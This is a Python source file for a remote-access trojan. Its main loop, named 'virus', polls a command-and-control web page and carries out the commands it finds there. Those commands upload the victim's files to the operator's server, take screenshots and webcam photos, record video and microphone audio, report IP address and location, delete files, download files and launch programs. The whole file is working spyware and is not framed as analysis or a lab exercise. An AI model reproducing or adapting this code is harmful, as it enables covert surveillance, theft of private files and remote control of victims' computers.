import requests, os, shutil
from bs4 import BeautifulSoup
import lxml
import numpy as np
import cv2
import pyautogui
from itertools import zip_longest
import wget
import webbrowser
import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
import datetime
import time
import geocoder

website = 'https://sharafox.pythonanywhere.com/'
current_path = os.environ['USERPROFILE']
msg = False

def remove(command):
    requests.get(website + 'remove' + command)

def view_files(location):
    def search(path, extension):
        for item in os.listdir(path):
            if "." in item:
                if extension in item:
                    requests.get(website + 'files/' + item)
                else:
                    pass
            elif "." not in item:
                try:
                    search(path + "\\" + item, extension)
                except:
                    pass
    search(location, ".jpg")
    search(location, ".png")
    search(location, ".mp4")
    search(location, ".mp3")
    search(location, ".txt")
    search(location, ".doc")
    search(location, ".pdf")

def search_file(path, name):
    global msg
    for item in os.listdir(path):
        if item == name:
            requests.get(website + 'files/' + path)
            msg = True
        elif "." not in item:
            try:
                search_file(path + "\\" + item, name)
            except:
                pass
def virus():
    global current_path
    while True:
        try:
            content = requests.get(website).content
            if str(content)[493] != '<':
                soup = BeautifulSoup(content, "lxml")
                command = soup.find_all("h6", {"class":"command"})[0].text
                if command == "get_path":
                    requests.post(website + 'response', data={'answer':current_path.replace("\\", "|")})
                    requests.get(website + 'done/true')
                    remove(command)
                elif command == "exit":
                    exit()
                elif command == "ls":
                    try:
                        files = os.listdir(current_path)
                        for file in files:
                            requests.get(website + 'files/' + file)
                    except:
                        pass
                    requests.get(website + 'done/true')
                    remove(command)
                elif command == "echo":
                    filename = soup.find_all("h6", {"class":"filename"})[0].text
                    text = soup.find_all("h6", {"class":"text"})[0].text
                    open(current_path + '\\' + filename, 'a').write(text)
                    remove(command)
                elif command == "view_files":
                    path = soup.find_all("h6", {"class":"path"})[0].text
                    view_files(path.replace("|", "\\"))
                    requests.get(website + 'done/true')
                    remove(command)
                elif command == "recv_file":
                    filename = soup.find_all("h6", {"class":"filename"})[0].text
                    requests.post(website + 'upload', files={'file':open(current_path + '\\' + filename, 'rb')})
                    requests.get(website + 'done/true')
                    remove(command)
                elif command == "recv_files":
                    files = os.listdir(current_path)
                    for file in files:
                        try:
                            requests.post(website + 'upload', files={'file':open(current_path + '\\' + file, 'rb')})
                            requests.get(website + 'files/' + file)
                        except:
                            pass
                    requests.get(website + 'done/true')
                    remove(command)
                elif command == "send_file":
                    filename = soup.find_all("h6", {"class":"filename"})[0].text
                    wget.download(website + 'static/' + filename)
                    remove(command)
                elif command == "cd..":
                    current_path = current_path[::-1]
                    to_re = ""
                    for l in current_path:
                        if l == "\\":
                            to_re += l
                            break
                        else:
                            to_re += l

                    current_path = current_path.replace(to_re, "", 1)
                    current_path = current_path[::-1]
                    requests.post(website + 'response', data={'answer':current_path.replace("\\", "|")})
                    requests.get(website + 'done/true')
                    remove(command)
                elif command == "get_ip":
                    ip = requests.get("https://api.ipify.org").text
                    requests.post(website + 'response', data={'answer':ip})
                    requests.get(website + 'done/true')
                    remove(command)
                elif command == "screen":
                    image = pyautogui.screenshot()
                    image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
                    cv2.imwrite(current_path + "\\screenshot.jpg", image)
                    requests.post(website + 'upload', files={'file':open(current_path + '\\screenshot.jpg', 'rb')})
                    requests.get(website + 'done/true')
                    os.remove(current_path + '\\screenshot.jpg')
                    remove(command)
                elif command == "take_pic":
                    cam_port = 0
                    cam = cv2.VideoCapture(cam_port)
                    result, image = cam.read()
                    cv2.imwrite(current_path + '\\capture.jpg', image)
                    requests.post(website + 'upload', files={'file':open(current_path + '\\capture.jpg', 'rb')})
                    requests.get(website + 'done/true')
                    os.remove(current_path + '\\capture.jpg')
                    remove(command)
                    break
                elif command == "get_loc":
                    g = geocoder.ip('me')
                    coor = g.latlng
                    requests.post(website + 'response', data={'answer':str(coor[0]) + '\n' + str(coor[1]) + '\n' + str(g)})
                    requests.get(website + 'done/true')
                    remove(command)
                elif "take_vid " in command:
                    li_num = int(command.replace("take_vid ", "")) * 20
                    fourcc = cv2.VideoWriter_fourcc(*'XVID')
                    out = cv2.VideoWriter(current_path + '\\video.avi', fourcc, 20.0, (640, 480))
                    cap = cv2.VideoCapture(0)
                    num = 0
                    while True:
                        ret, frame = cap.read()
                        if not ret:
                            break

                        out.write(frame)
                        num += 1

                        if num == li_num:
                            break

                    cap.release()
                    out.release()
                    cv2.destroyAllWindows()
                    requests.post(website + 'upload', files={'file':open(current_path + '\\video.avi', 'rb')})
                    requests.get(website + 'done/true')
                    os.remove(current_path + '\\video.avi')
                    remove(command)
                elif "rec_vid " in command:
                    now = str(datetime.datetime.now())
                    filename = ""
                    pyautogui.hotkey('alt', 'F9')
                    time.sleep(int(command.replace("rec_vid ", "")))
                    pyautogui.hotkey('alt', 'F9')

                    for i in now:
                        if i == '.':
                            filename += ".mp4"
                            break
                        else:
                            filename += i
                    filename = filename.replace(':', '-')
                    filename = filename.replace(' ', '-')
                    requests.post(website + 'upload', files={'file':open(os.environ['USERPROFILE'] + '\\Videos\\Captures\\' + filename, 'rb')})
                    requests.post(website + 'response', data={'answer':filename})
                    requests.get(website + 'done/true')
                    os.remove(os.environ['USERPROFILE'] + '\\Videos\\Captures\\' + filename)
                    remove(command)
                elif "rec_aud " in command:
                    freq = 44100
                    duration = int(command.replace("rec_aud ", ""))
                    recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
                    sd.wait()
                    write(current_path + '\\' + "audio.wav", freq, recording)
                    requests.post(website + 'upload', files={'file':open(current_path + '\\audio.wav', 'rb')})
                    requests.get(website + 'done/true')
                    os.remove(current_path + '\\audio.wav')
                    remove(command)
                elif "cd " in command:
                    if ':' in command:
                        try:
                            open(command.replace("cd ", "", 1) + '\\t', 'a')
                            os.remove(command.replace("cd ", "", 1) + '\\t')
                            current_path = command.replace("cd ", "", 1)
                            requests.post(website + 'response', data={'answer':current_path.replace("\\", "|")})
                        except:
                            requests.post(website + 'response', data={'answer':"This drive doesn't exist !"})
                    else:
                        dir = command.replace("cd ", "", 1)
                        current_path += '\\' + dir
                        requests.post(website + 'response', data={'answer':current_path.replace("\\", "|")})
                    requests.get(website + 'done/true')
                    remove(command)
                elif "md " in command:
                    os.mkdir(os.path.join(current_path + '\\', command.replace("md ", "", 1)))
                    remove(command)
                elif "rd " in command:
                    shutil.rmtree(current_path + '\\', command.replace("rd ", "", 1))
                    remove(command)
                elif "del " in command:
                    os.remove(current_path + '\\' + command.replace("del ", "", 1))
                    remove(command)
                elif "search " in command:
                    path = soup.find_all("h6", {"class":"path"})[0].text
                    search_file(path.replace("|", "\\"), command.replace("search ", "", 1))
                    if msg == False:
                        requests.get(website + 'files/there is no file with this name')
                    requests.get(website + 'done/true')
                    remove(command)
                elif "call " in command:
                    os.system("start " + current_path + '\\' + command.replace("call ", "", 1))
                    remove(command)
                elif "url " in command:
                    command = command.replace("url ", "", 1)
                    webbrowser.open(command.replace("|", "/"))
                    remove(command)
            else:
                pass
        except:
            print("error")
            remove(command)

while True:
    virus()